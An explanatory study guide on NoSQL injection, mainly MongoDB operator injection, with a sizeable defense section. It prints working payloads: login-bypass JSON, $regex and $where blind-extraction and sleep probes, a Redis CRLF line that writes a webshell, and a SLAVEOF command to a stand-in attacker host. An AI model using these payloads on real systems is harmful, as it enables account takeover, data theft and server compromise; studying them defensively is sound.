# NoSQL Injection

> NoSQL injection is the same data-into-code confusion as SQLi, but the "code" is usually not a string language: in document stores like MongoDB the query is a structured object, so the high-value attack is not breaking quotes but smuggling a query operator into a position the developer expected to hold a plain value. When an HTTP layer decodes `username[$ne]=x` or `{"username":{"$ne":"x"}}` into a nested object and the app passes that object straight into a query, the attacker has injected a `$ne`/`$gt`/`$regex`/`$where` operator that the engine faithfully evaluates. Two flavors follow from this: syntax injection (you break out of a string context, classic and SQL-like, often into `$where` JavaScript) and operator injection (you promote a scalar value into an operator object). The fix rhymes with parameterization: keep user data as typed data, never as query structure, so a string stays a string and can never become an operator.

## How it works

MongoDB queries are BSON/JSON documents. A lookup the developer writes as an equality check is really `{"category": "fizzy"}`, and operators are just reserved keys beginning with `$` nested inside the value. The operators that matter for injection:

- `$ne`, `$gt`, `$lt`, `$gte`, `$lte`: comparison operators. `{"$ne": "x"}` matches anything not equal to `x`; combined across fields this bypasses equality checks.
- `$in`, `$nin`: set membership. `{"$in": ["admin","administrator"]}` targets likely accounts.
- `$regex`: pattern match, the workhorse for blind character-by-character extraction.
- `$where`: matches documents for which a JavaScript expression returns true. This is server-side JS evaluation and is the most dangerous operator; the related `mapReduce()` and (historically) `$expr`/`$function` also run JS on some configurations.
- `$exists`, `$type`: probe schema shape.

The vulnerability is created by how the transport is shaped into a query object. Two shaping paths:

```
# URL / form encoding: bracket syntax becomes a nested object in many parsers
username[$ne]=invalid          -> { username: { $ne: "invalid" } }

# JSON body: the operator is simply a nested object
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Express with the `qs`/`extended` body parser and `express.json()` will parse both of those into real nested objects. If that object is handed to `db.collection.find(req.body)` or to a Mongoose query without type coercion, the operator is live. This is why frameworks "enable" the bug: the parser helpfully turns attacker text into exactly the object shape the query API consumes.

Syntax injection also exists where the server builds a JavaScript string, for example a `$where` clause assembled as `"this.username == '" + input + "'"`. Then it behaves like SQLi: a stray `'` breaks it, and you inject boolean logic. Fuzz probe for a string-context break (URL-encoded here):

```
'"`{
;$Foo}
$Foo \xYZ
```

A response change versus the base value suggests characters are interpreted rather than treated as data. Confirm with a repair test: `this.category == '\''` (escaped quote) should not error while `this.category == '''` does.

## Attack techniques

1. Authentication bypass via operator injection. The archetype. A login that runs `db.users.findOne({username: u, password: p})` with `u` and `p` taken from the request body is broken by promoting both to `$ne`:

   ```json
   {"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
   ```

   This matches every user whose username and password are not `"invalid"`, and `findOne` returns the first document, logging you in as (typically) the first user in the collection. To land on a specific privileged account, pin the username and only loosen the password:

   ```json
   {"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
   ```

   Why it works: the app compared a field to a value, but you replaced the value with a predicate, and MongoDB evaluates predicates wherever they appear in the filter tree.

2. Overriding conditions in syntax injection. When you can break a string context, inject an always-true tail so hidden rows appear:

   ```
   fizzy'||'1'=='1        -> this.category == 'fizzy'||'1'=='1'
   ```

   MongoDB also historically ignores everything after a null byte in some contexts, so `fizzy'%00` can truncate a trailing `&& this.released == 1` restriction and surface unreleased records. Treat null-byte truncation as version-dependent behavior to test, not a guarantee.

3. `$where` JavaScript evaluation (syntax injection into a JS sink). If the query already uses `$where` (or `mapReduce`), you inject a JavaScript expression that reads other fields of the current document and folds the answer into a boolean:

   ```
   admin' && this.password[0] == 'a' || 'a'=='b
   admin' && this.password.match(/\d/) || 'a'=='b       # does the password contain a digit?
   ```

   Because the expression runs per document with access to `this`, you can walk the password one character at a time. `$where` is slow (it runs JS for every candidate document) and is disabled by default in modern MongoDB, which is exactly why the operator-injection variant below matters.

4. Blind extraction with `$regex` (operator injection, no JS needed). Even when the original query never uses `$where`, you can inject `$regex` in a value position and read data character by character from the true/false difference between a login success and failure:

   ```json
   {"username":"admin","password":{"$regex":"^.*"}}     // baseline: matches
   {"username":"admin","password":{"$regex":"^a.*"}}    // does it start with 'a'?
   {"username":"admin","password":{"$regex":"^ab.*"}}   // extend the known prefix
   ```

   Each request answers one prefix question; iterate the alphabet per position. This is the NoSQL analogue of boolean-blind SQLi, and it needs no server-side JavaScript at all, so it works on hardened deployments where `$where` is off.

5. Injecting your own operator to reach JavaScript. If you can add extra keys to the query object, inject a `$where` as a sibling key and test whether it is evaluated:

   ```json
   {"username":"wiener","password":"peter","$where":"0"}   // false
   {"username":"wiener","password":"peter","$where":"1"}   // true
   ```

   A response difference proves the JS expression runs. Then enumerate field names without a wordlist using JS reflection:

   ```json
   {"$where":"Object.keys(this)[0].match('^.{0}a.*')"}      // first char of first field name
   ```

6. Field-name discovery (schemaless collections have no fixed columns). Before extracting, confirm a field exists by comparing a known-good field against a guess:

   ```
   admin' && this.password!='          # if 'password' exists, response matches the known-field case
   admin' && this.foo!='               # nonexistent field: different response
   ```

   Or extract names character by character with the `Object.keys(this)` reflection above.

7. Timing-based blind (when responses do not differ). Use JS to burn time only when the condition holds:

   ```
   admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
   {"$where":"sleep(5000)"}
   ```

   Baseline the page load first, then infer truth from the added delay. Same oracle idea as time-based SQLi.

8. Aggregation and `$lookup` risks. If user input reaches an aggregation pipeline, injected stages/operators can do more than filter. `$lookup` performs a join into another collection, so an injected or attacker-shaped `$lookup` can pull documents from a collection the endpoint was never meant to expose (for example joining `users` into a product query and projecting credentials). `$where`, `$accumulator`, and `$function` inside a pipeline are JS-execution sinks on configurations that allow server-side JavaScript. Treat any endpoint that builds pipeline stages from request data as a high-severity sink.

9. `$regex` weaponized for database DoS. Operator injection is not only a data-extraction primitive. On a hardened target where `$where` is disabled and authentication bypass is not exploitable, an attacker who can inject `$regex` in a value position can still cause an availability incident by supplying a catastrophic-backtracking pattern. A classic evil regex like `^(a+)+$` matched against a moderately long attacker-controlled anchor value burns CPU inside the regex engine, and an unanchored pattern like `.*secret.*` forces a full collection scan without touching an index. Either shape ties up worker threads on the mongod process and starves legitimate traffic.

   The mental model is that operator injection promotes a value into a predicate, and here the predicate is expensive to evaluate rather than illuminating. This is a distinct blast radius from data exfiltration and matters even when the confidentiality path is closed off. Defense is to cap regex length and complexity at the input layer, refuse client-supplied regex entirely for value positions and instead build the operator server-side around a sanitized substring, and monitor slow-query logs for unindexed `$regex` scans as a detection signal.

10. Second-order operator injection. The injection sink does not have to be the request that carried the payload. An attacker stores a value like `{"$ne":""}` inside a profile field, a saved-search document, or a preference blob that the app accepts as opaque JSON. Later, an unrelated code path reads that stored value and splices it into a filter, for example an aggregation `$match` built from the saved search or a personalization query that reuses stored preferences as a partial filter. The operator now fires with the trust context of the second request, and the audit trail points at whoever triggered the read rather than whoever planted the payload.

    Defense mirrors the first-order case but applied on the read side: cast and validate values pulled from the database before using them as query fragments, treat stored JSON blobs as untrusted the same way you treat request bodies, and never round-trip attacker-controlled JSON straight back into a `find()` or aggregation stage without shape validation. This is the NoSQL analogue of stored XSS versus reflected XSS, the same primitive with a delayed detonation.

11. Beyond MongoDB. The document-store operator-injection model is the interview-famous case, but a Principal-level candidate is expected to reason across engines because the mental model transfers wherever structure and data are mixed.

    Redis is a command protocol (RESP), and injection happens when user input reaches a raw command builder that concatenates strings, or when input is spliced into an `EVAL` Lua script. A `\r\n` sequence lets the attacker terminate one command and append another, so `SET key value\r\nCONFIG SET dir /var/www\r\nSAVE` reconfigures the persistence directory and writes a webshell, and `SLAVEOF attacker.example.com 6379` or `MODULE LOAD` are similar escalation targets on unhardened instances. Defense is a client library that emits length-prefixed RESP arrays with argument boundaries the server cannot confuse with new commands, disabling dangerous commands (`CONFIG`, `MODULE`, `SLAVEOF`) via `rename-command`, and treating any Lua script as code that must not embed user input by string interpolation.

    Elasticsearch has two distinct injection classes. Query DSL injection is the operator-injection analogue: user JSON merged into a query object lets an attacker add clauses, replace `term` with `match_all`, or pivot into fields the endpoint never intended to expose. Script query injection is more severe on legacy versions where dynamic scripting ran Groovy or MVEL and reached code execution; on current versions Painless is sandboxed but still evaluates attacker-shaped logic if `source` is built by concatenation. Defense is to disable dynamic scripting where not needed, restrict to Painless with parameters passed through the `params` map, and never concatenate user input into a script `source`.

    CouchDB and Couchbase N1QL, plus Cassandra CQL, are SQL-like enough that the classical SQLi rules apply directly: string concatenation into query text is the bug, prepared statements or the driver's parameter binding is the fix. The abstraction that carries across all of these engines is the same one that drives the MongoDB section above, separate structure from data at the client boundary and refuse to let request-shaped input decide which operator or command runs.

## Defense

1. Keep user data typed as data, and cast value positions to their expected primitive before querying. The core of operator injection is a string field silently becoming an object; forcing `String(req.body.username)` (and rejecting or coercing non-strings) makes `{"$ne":...}` collapse to a harmless string and never reach the query as an operator. Validate types explicitly at the boundary.

2. Use a schema/ODM with declared types and strict mode. Mongoose with a typed schema will cast a field declared `String` and reject an object where a scalar is expected, which neutralizes the classic `$ne`/`$regex` operator injection for those fields. Do not defeat this by declaring fields as `Mixed` or by passing raw `req.body` into `find`. Prefer `Model.findOne({username: String(u)})` with explicit fields over `Model.findOne(req.body)`.

3. Reject or strip keys beginning with `$` (and containing `.`) from user-controlled objects. Apply an allowlist of accepted keys per endpoint so query operators cannot appear in input, and sanitize dotted keys that could reach into nested paths. In Node this is the job of libraries like `express-mongo-sanitize` (removes or replaces `$`/`.` keys) or manual key validation; the durable control is an allowlist of expected field names, not a blocklist of operators.

4. Disable server-side JavaScript. Run MongoDB with `security.javascriptEnabled: false` (mongod `--noscripting` historically) so `$where`, `mapReduce`, and `$function` cannot execute injected JS at all. Modern MongoDB disables `$where` scripting by default; keep it that way and avoid `$where` in application code entirely, preferring native operators that the query planner can index.

5. Parameterize / separate structure from data. Insert user input as bound values rather than concatenating it into a query string or JS expression (the OWASP guidance for the entire injection family: use a safe API that separates code from data, validate input with an allowlist, and only escape as a last resort). For NoSQL specifically that means building the filter object in code with fixed operators and slotting the sanitized value in, never letting the client dictate the operator.

6. Defense in depth. Least privilege on the DB account (the app user should not be able to run admin commands or read collections it does not need), disable verbose errors in production, and validate input length/format/charset with an allowlist as a secondary check. As with SQLi, none of these replaces keeping operators out of value positions; they cap damage.

7. Do not rely on key-stripping sanitizers as the primary control, and know the specific bypass classes. The invariant to enforce is a positive allowlist of expected field names at the query-construction site plus explicit type casting per field; key-stripping is a secondary defense that closes a common shape but does not close the class. The concrete bypass classes an interviewer will name are (a) depth-limited stripping, where older sanitizer versions only walk top-level keys, so a nested payload like `{"filter":{"user":{"$ne":1}}}` reaches the query with the operator intact if the app later destructures `filter.user` into a filter, (b) prototype-pollution keys such as `__proto__` and `constructor.prototype`, which historically were not treated as query operators by the sanitizer but which mutate `Object.prototype` and cause downstream code that builds queries via `{...defaults, ...input}` to inherit attacker-controlled properties, and (c) replace-mode configurations that swap `$` for another character but leave the operator structurally intact when a lenient driver or hand-rolled query builder normalizes the key back. The common wrong implementation is dropping `mongoSanitize()` in as middleware and considering the endpoint fixed; the operator-injection payload is defeated at the query site by casting `req.body.username` to `String`, and the sanitizer is a belt on top of that, not the belt itself.

## Interview-grade nuances

- The senior insight is that in document databases the primary attack is operator injection, not quote-breaking. A candidate who only talks about escaping quotes has the SQL mental model and will miss `{"$ne":""}` entirely.
- `express-mongo-sanitize` and `mongo-sanitize` reduce risk but are not a complete fix: they strip `$` keys but do not stop a value that is legitimately a string from being used in an unauthorized way, and misconfiguration or a bypass (unusual key encodings, deeply nested objects) can slip through. The durable control is type enforcement plus a key allowlist.
- `$where` is disabled by default in current MongoDB, so do not assume JS-eval extraction is available; the `$regex` operator-injection path needs no JS and is the reliable blind channel on hardened targets.
- A Mongoose schema is not automatically safe: `find(req.body)`, `Schema.Types.Mixed`, `strict:false`, and passing raw objects into `$where`/aggregation reopen the hole. Type declarations only help on the fields they cover and only when the raw request object is not passed straight through.
- GET-to-POST-to-JSON pivoting is a real testing detail: if `param[$ne]=x` does not parse, switch the method to POST, set `Content-Type: application/json`, and put the operator in the JSON body, because different parsers accept different shapes.
- The impact ceiling is higher than "auth bypass": server-side JS (`$where`/`$function`/`mapReduce`) can lead to code execution on misconfigured servers, `$lookup` can cross collection boundaries, and a well-tuned `$where` can denial-of-service the database by running expensive JS per document.
- Timing and boolean oracles carry the same math as SQLi: character-by-character extraction over a yes/no signal, cheap with a prefix `$regex` binary walk, slow but reliable with a `$where` sleep when responses are identical.

## Sources

- PortSwigger Web Security Academy, NoSQL injection: https://portswigger.net/web-security/nosql-injection
- OWASP Web Security Testing Guide, Testing for NoSQL Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
- OWASP, Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
- OWASP, NoSQL Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Security_Cheat_Sheet.html
